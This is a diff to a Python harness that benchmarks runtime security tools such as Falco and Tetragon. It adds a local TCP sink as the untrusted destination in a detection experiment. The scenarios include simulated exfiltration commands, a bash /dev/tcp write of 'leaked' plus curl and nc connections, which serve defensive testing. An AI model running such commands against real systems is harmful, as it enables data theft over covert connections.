@@ -27,11 +27,13 @@ import hashlib
 import json
 import os
 import shlex
+import re
 import shutil
 import signal
 import socket
 import subprocess
 import sys
+import threading
 import time
 import urllib.request
 from datetime import datetime
@@ -57,13 +59,17 @@ STRAY_PROCESS_NAMES = ["falco", "tetragon", "kshield_vpatch", "kshield_vpatch_ls
 RAW_FIELDS = ["workload", "round", "group", "run", "throughput_rps", "latency_mean_ms",
               "latency_p99_ms", "failures", "tool_cpu_s", "tool_rss_kb"]
 
-SCENARIOS = [
-    # (이름, entrypoint, 공격 여부)
-    ("benign_echo", "echo benign-job", False),
-    ("curl_untrusted", "curl -s -m 3 -o /dev/null http://1.1.1.1/", True),
-    ("bash_devtcp", "bash -c 'exec 3<>/dev/tcp/1.1.1.1/80; echo leaked >&3'", True),
-    ("nc_untrusted", "nc -w 2 1.1.1.1 80 < /dev/null", True),
+# (이름, 공격 여부, entrypoint 템플릿). {ip}:{port}는 신뢰되지 않은 목적지(Sink)다.
+SCENARIO_TEMPLATES = [
+    ("benign_echo", False, "echo benign-job"),
+    ("curl_untrusted", True, "curl -s -m 3 -o /dev/null http://{ip}:{port}/"),
+    ("bash_devtcp", True, "bash -c 'exec 3<>/dev/tcp/{ip}/{port}; echo leaked >&3'"),
+    ("nc_untrusted", True, "nc -w 2 {ip} {port} < /dev/null"),
 ]
+
+
+def build_scenarios(ip, port):
+    return [(name, cmd.format(ip=ip, port=port), attack) for name, attack, cmd in SCENARIO_TEMPLATES]
 
 
 def log(msg):
@@ -365,6 +371,83 @@ def submit_job(host, port, entrypoint, timeout=10):
         return resp.status
 
 
+class Sink:
+    """신뢰되지 않은(비 loopback) 목적지 역할을 하는 최소 TCP 수신기.
+
+    VM이 외부망(예: 1.1.1.1)에 닿지 않아도 실험이 성립하도록 VM 자신의 비 loopback IPv4
+    주소에 붙는다. 세 도구 모두 127.0.0.0/8 밖의 주소를 신뢰되지 않은 목적지로 취급하므로
+    판정 기준은 같다. 연결 수립 수와 수신 바이트 수를 세어 차단이 첫 바이트가 나가기 전에
+    이뤄졌는지도 본다(off 그룹에서는 모든 공격 시나리오가 수립돼야 한다)."""
+
+    def __init__(self, ip, port):
+        self.ip, self.port = ip, port
+        self.accepted = 0
+        self.bytes = 0
+        self._lock = threading.Lock()
+        self._stop = threading.Event()
+        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self._srv.bind((ip, port))
+        self._srv.listen(64)
+        self._srv.settimeout(0.5)
+        self._thread = threading.Thread(target=self._loop, daemon=True)
+        self._thread.start()
+
+    def _loop(self):
+        while not self._stop.is_set():
+            try:
+                conn, _ = self._srv.accept()
+            except socket.timeout:
+                continue
+            except OSError:
+                return
+            threading.Thread(target=self._handle, args=(conn,), daemon=True).start()
+
+    def _handle(self, conn):
+        with self._lock:
+            self.accepted += 1
+        try:
+            conn.settimeout(1.0)
+            data = conn.recv(4096)
+            with self._lock:
+                self.bytes += len(data)
+            conn.sendall(b"HTTP/1.0 200 OK\r\nContent-Length: 0\r\n\r\n")
+        except OSError:
+            pass
+        finally:
+            conn.close()
+
+    def snapshot(self):
+        with self._lock:
+            return self.accepted, self.bytes
+
+    def close(self):
+        self._stop.set()
+        self._srv.close()
+        self._thread.join(timeout=2)
+
+
+def resolve_untrusted_ip(args):
+    """신뢰되지 않은 목적지로 쓸 VM 자신의 비 loopback IPv4 주소."""
+    if args.untrusted_ip != "auto":
+        ip = args.untrusted_ip
+    else:
+        ip = None
+        m = re.search(r"\bsrc (\d+\.\d+\.\d+\.\d+)", run(["ip", "-4", "route", "get", "1.1.1.1"]).stdout)
+        if m:
+            ip = m.group(1)
+        else:
+            for tok in run(["hostname", "-I"]).stdout.split():
+                if re.fullmatch(r"\d+\.\d+\.\d+\.\d+", tok):
+                    ip = tok
+                    break
+    if not ip:
+        die("VM의 비 loopback IPv4 주소를 찾지 못했습니다. --untrusted-ip 로 지정하세요.")
+    if ip.startswith("127."):
+        die(f"{ip} 는 loopback이라 세 도구 모두 신뢰합니다. 비 loopback 주소를 지정하세요.")
+    return ip
+
+
 def wait_result(path, timeout):
     end = time.time() + timeout
     while time.time() < end:
@@ -527,7 +610,7 @@ def cmd_perf(args):
 
 
 # ── detect ──────────────────────────────────────────────────────────────────
-def kshield_state_check(args):
+def kshield_state_check(args, untrusted_ip):
     ctl = KSHIELD_CTL
     if not os.access(ctl, os.X_OK):
         log("[경고] kshield_ctl 없음 — 신뢰 IP/예외 목록 점검을 건너뜁니다.")
@@ -536,15 +619,16 @@ def kshield_state_check(args):
         r = run([ctl, sub, "--target", "v3"])
         out = (r.stdout + r.stderr).strip()
         log(f"  kshield_ctl {sub}: {out or '(비어 있음)'}")
-        if sub == "trust-list" and "1.1.1.1" in out:
-            die("1.1.1.1 이 신뢰 목적지로 등록되어 있어 탐지 실험이 왜곡됩니다. "
-                "sudo ./src/kshield_ctl trust-del 1.1.1.1 후 다시 실행하세요.")
+        if sub == "trust-list" and untrusted_ip in out:
+            die(f"{untrusted_ip} 가 신뢰 목적지로 등록되어 있어 탐지 실험이 왜곡됩니다. "
+                f"sudo ./src/kshield_ctl trust-del {untrusted_ip} 후 다시 실행하세요.")
 
 
 def cmd_detect(args):
     require_root()
     groups = parse_groups(args)
-    scenarios = list(SCENARIOS)
+    ip = resolve_untrusted_ip(args)
+    scenarios = build_scenarios(ip, args.untrusted_port)
     if not shutil.which("nc"):
         log("[경고] nc 가 없어 nc_untrusted 시나리오를 건너뜁니다.")
         scenarios = [s for s in scenarios if s[0] != "nc_untrusted"]
@@ -555,7 +639,19 @@ def cmd_detect(args):
     logdir = os.path.join(RESULTS_DIR, f"cmp_detect_logs_{ts}")
     os.makedirs(logdir)
     out_path = os.path.join(RESULTS_DIR, f"cmp_detect_{ts}.csv")
+    meta_path = os.path.join(RESULTS_DIR, f"cmp_detect_meta_{ts}.json")
+    meta = collect_meta(args, groups)
+    meta["untrusted_dest"] = f"{ip}:{args.untrusted_port}"
+    with open(meta_path, "w", encoding="utf-8") as f:
+        json.dump(meta, f, ensure_ascii=False, indent=2)
     rows = []
+
+    try:
+        sink = Sink(ip, args.untrusted_port)
+    except OSError as e:
+        die(f"Sink를 {ip}:{args.untrusted_port} 에 열지 못했습니다: {e} "
+            "(포트 사용 중이면 --untrusted-port 로 바꾸세요)")
+    log(f"신뢰되지 않은 목적지(Sink): {ip}:{args.untrusted_port}")
 
     try:
         for group in groups:
@@ -565,15 +661,17 @@ def cmd_detect(args):
             try:
                 tool.start()
                 if group == "kshield":
-                    kshield_state_check(args)
+                    kshield_state_check(args, ip)
                 server = start_server(args, logdir)
                 for name, cmd, is_attack in scenarios:
                     for rep in range(1, args.repeats + 1):
                         resfile = f"/tmp/kcmp_{os.getpid()}_{name}_{rep}.res"
                         offset = tool.log_size()
+                        acc0, bytes0 = sink.snapshot()
                         submit_job(args.host, args.port, f"{cmd}; echo rc=$? > {resfile}")
                         rc = wait_result(resfile, args.scenario_timeout)
                         time.sleep(args.settle)
+                        acc1, bytes1 = sink.snapshot()
                         new = tool.read_log_from(offset)
                         detected = any(m in new for m in tool.markers)
                         killed = rc == 137
@@ -581,25 +679,35 @@ def cmd_detect(args):
                             os.remove(resfile)
                         rows.append({"group": group, "scenario": name, "attack": int(is_attack),
                                      "rep": rep, "rc": "" if rc is None else rc,
-                                     "killed": int(killed), "detected": int(detected)})
+                                     "killed": int(killed), "detected": int(detected),
+                                     "accepted": acc1 - acc0, "leaked_bytes": bytes1 - bytes0})
                     sub = [r for r in rows if r["group"] == group and r["scenario"] == name]
                     log(f"  {name:<15} 탐지 {sum(r['detected'] for r in sub)}/{len(sub)}  "
-                        f"SIGKILL {sum(r['killed'] for r in sub)}/{len(sub)}")
+                        f"SIGKILL {sum(r['killed'] for r in sub)}/{len(sub)}  "
+                        f"연결수립 {sum(r['accepted'] > 0 for r in sub)}/{len(sub)}  "
+                        f"유출바이트 {sum(r['leaked_bytes'] for r in sub)}")
+                    if group == "off" and is_attack and not any(r["accepted"] for r in sub):
+                        log("    [경고] 도구가 없는데도 Sink에 연결이 수립되지 않았습니다. "
+                            "방화벽·주소를 확인하세요(이 그룹은 기준선입니다).")
             finally:
                 stop_server(server)
                 tool.stop()
                 time.sleep(args.cooldown)
     finally:
+        sink.close()
         if rows:
             with open(out_path, "w", newline="", encoding="utf-8") as f:
                 w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
                 w.writeheader()
                 w.writerows(rows)
         chown_tree(logdir)
-        if os.path.exists(out_path):
-            chown_tree(out_path)
-    log(f"\n결과: {out_path}")
-    log("해석: killed = 프로세스가 SIGKILL(rc=137)로 종료됨. Falco는 탐지만 하므로 killed=0이 정상.")
+        for p in (out_path, meta_path):
+            if os.path.exists(p):
+                chown_tree(p)
+    log(f"\n결과: {out_path}\n메타데이터: {meta_path}")
+    log("해석: killed = 프로세스가 SIGKILL(rc=137)로 종료됨. Falco는 탐지만 하므로 killed=0이 정상.\n"
+        "      연결수립/유출바이트 = Sink가 실제로 받은 연결·데이터. 비동기 SIGKILL이라 차단돼도 "
+        "연결이 수립될 수 있으며, 유출바이트가 0이면 첫 데이터가 나가기 전에 차단된 것이다.")
 
 
 def parse_groups(args):
@@ -616,6 +724,9 @@ def build_parser():
     p.add_argument("--host", default="127.0.0.1",
                    help="벤치마크 접속 주소. localhost가 ::1로 풀리면 IPv6 connect가 섞이므로 127.0.0.1 고정")
     p.add_argument("--port", type=int, default=8265)
+    p.add_argument("--untrusted-ip", default="auto",
+                   help="탐지 실험의 '신뢰되지 않은 목적지'로 쓸 VM의 비 loopback IPv4. auto = 기본 경로의 출발지 주소")
+    p.add_argument("--untrusted-port", type=int, default=18080, help="Sink 수신 포트")
     p.add_argument("--tool-warmup", type=float, default=8.0, help="도구 기동 후 대기(초)")
     p.add_argument("--cooldown", type=float, default=5.0, help="블록 사이 대기(초)")
     p.add_argument("--kshield-args", default="", help="kshield_vpatch 추가 인자")
